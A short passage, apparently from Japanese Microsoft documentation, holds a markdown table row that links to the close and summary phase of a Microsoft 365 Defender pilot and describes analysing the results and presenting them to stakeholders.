|![終了フェーズと要約フェーズ](../../media/mtp/close.png) <br>[終了フェーズと要約フェーズ](mtp-pilot-close.md)|Microsoft 365 Defender パイロットの結果を分析し、関係者に提示して、次の手順を実行します。
|:-----|:-----|
